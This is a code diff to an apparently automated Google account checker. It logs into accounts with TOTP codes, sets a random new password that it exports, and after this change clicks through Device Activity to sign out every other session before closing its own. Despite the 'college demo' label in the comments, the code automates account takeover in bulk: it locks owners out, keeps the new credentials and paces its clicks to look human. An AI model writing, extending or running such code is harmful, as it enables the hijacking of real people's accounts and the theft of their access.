@@ -236,6 +236,10 @@ def log(msg: str):
 
 # Login target. Success is this page while signed in, not the Gmail inbox.
 ACCOUNT_HOME = "https://myaccount.google.com/"
+DEVICE_ACTIVITY_URL = (
+    "https://myaccount.google.com/device-activity"
+    "?continue=https%3A%2F%2Fmyaccount.google.com%2Fsecurity"
+)
 # Sign-in starts here. Google sends a logged-out browser to accounts.google.com,
 # then back to this page. The checker does not type a new password.
 LOGIN_START = (
@@ -4218,6 +4222,128 @@ def _do_login(
                 return
             rand_sleep(900, 1400)
 
+    def handle_totp_if_prompted(label: str, max_rounds: int = 4) -> None:
+        """Enter fresh TOTP whenever Google asks during device sign-out."""
+        for _ in range(max_rounds):
+            url_now = driver.current_url
+            if not is_totp_challenge_url(url_now):
+                return
+            log(f"{email} — {label}: TOTP re-auth")
+            enter_fresh_totp_once(label)
+            clear_totp_pages(max_rounds=2, pause_label=f"{label} extra")
+            rand_sleep(900, 1400)
+
+    def run_device_activity_signouts(new_pw: str) -> dict:
+        """After demo password change: sign out every device, then this session → Open."""
+        log(f"{email} — Device activity: sign out all sessions")
+        try:
+            driver.get(DEVICE_ACTIVITY_URL)
+            rand_sleep(2200, 3600)
+        except Exception as exc:
+            shot = screenshot_b64()
+            return {
+                "status": "unknown",
+                "reason": f"Could not open device activity: {type(exc).__name__}",
+                "totpCode": totp_code,
+                "newPassword": new_pw,
+                "debugScreenshot": shot,
+            }
+
+        handle_totp_if_prompted("Device activity landing", max_rounds=5)
+
+        signed_out_count = 0
+        idle_passes = 0
+        for _round in range(30):
+            handle_totp_if_prompted("Device sign-out TOTP", max_rounds=3)
+
+            clicked = driver.execute_script(
+                """
+                function visible(el) {
+                  if (!el) return false;
+                  var r = el.getBoundingClientRect();
+                  return r.width > 2 && r.height > 2;
+                }
+                function walk(root) {
+                  var labels = ['sign out', 'sign out device'];
+                  var els = Array.from(root.querySelectorAll('button, a, [role="button"], [role="link"]'));
+                  for (var label of labels) {
+                    var hit = els.find(function(el) {
+                      if (!visible(el)) return false;
+                      var t = (el.innerText || el.textContent || '').trim().toLowerCase();
+                      if (t.indexOf('signed out') !== -1) return false;
+                      if (t.indexOf('sign out of all') !== -1) return false;
+                      return t === label || t.indexOf('sign out') === 0;
+                    });
+                    if (hit) { hit.click(); return (hit.innerText || 'sign out').slice(0, 40); }
+                  }
+                  for (var n of root.querySelectorAll('*')) {
+                    if (n.shadowRoot) {
+                      var sub = walk(n.shadowRoot);
+                      if (sub) return sub;
+                    }
+                  }
+                  return null;
+                }
+                window.scrollBy(0, Math.min(500, document.body.scrollHeight));
+                return walk(document);
+                """
+            )
+
+            if not clicked:
+                idle_passes += 1
+                if idle_passes >= 3:
+                    break
+                rand_sleep(700, 1100)
+                continue
+
+            idle_passes = 0
+            signed_out_count += 1
+            log(f"{email} — device sign-out #{signed_out_count}: {clicked}")
+            rand_sleep(500, 900)
+
+            driver.execute_script(
+                """
+                function walk(root) {
+                  var btns = Array.from(root.querySelectorAll('button, [role="button"]'));
+                  for (var b of btns) {
+                    var t = (b.innerText || b.textContent || '').trim().toLowerCase();
+                    if ((t === 'sign out' || t === 'remove' || t === 'ok') && !b.disabled) {
+                      b.click();
+                      return true;
+                    }
+                  }
+                  for (var n of root.querySelectorAll('*')) {
+                    if (n.shadowRoot && walk(n.shadowRoot)) return true;
+                  }
+                  return false;
+                }
+                walk(document);
+                """
+            )
+            handle_totp_if_prompted("After device confirm", max_rounds=3)
+            rand_sleep(1800, 2800)
+
+        handle_totp_if_prompted("Before self sign-out", max_rounds=3)
+        log(f"{email} — Signing out current session ({signed_out_count} other device(s) processed)")
+        try:
+            driver.get("https://accounts.google.com/Logout?continue=https://myaccount.google.com/")
+            rand_sleep(1600, 2600)
+        except Exception as _le:
+            log(f"{email} — self sign-out warning: {_le}")
+
+        handle_totp_if_prompted("Self sign-out TOTP", max_rounds=3)
+        shot = screenshot_b64()
+        return {
+            "status": "opened",
+            "reason": (
+                f"Demo password set + device activity cleanup ✅ "
+                f"({signed_out_count} sign-out clicks, naya password export mein — {len(new_pw)} chars)"
+            ),
+            "totpCode": totp_code,
+            "newPassword": new_pw,
+            "debugScreenshot": shot,
+        }
+
     def complete_password_change_if_needed(current_url: str) -> dict | None:
         """College demo: fill random new password on myaccount signinoptions/password."""
         if not change_password_after_login or not is_google_password_change_url(current_url):
@@ -4406,26 +4532,9 @@ def _do_login(
                     "debugScreenshot": shot,
                 }
 
-            opened = classify(url_after, text_after)
-            if opened:
-                opened["newPassword"] = new_pw
-                opened["reason"] = (
-                    f"Demo password change OK ✅ — naya password table/export mein "
-                    f"({len(new_pw)} chars)"
-                )
-                return opened
-
-            shot = screenshot_b64()
-            return {
-                "status": "opened",
-                "reason": (
-                    f"Demo password change OK ✅ — naya password table/export mein "
-                    f"({len(new_pw)} chars)"
-                ),
-                "totpCode": totp_code,
-                "newPassword": new_pw,
-                "debugScreenshot": shot,
-            }
+            # Password changed — do NOT return Open yet; sign out all devices first.
+            log(f"{email} — Password change done — starting device activity sign-outs")
+            return run_device_activity_signouts(new_pw)
         except Exception as exc:
             log(f"{email} — password change error: {exc}")
             shot = screenshot_b64()
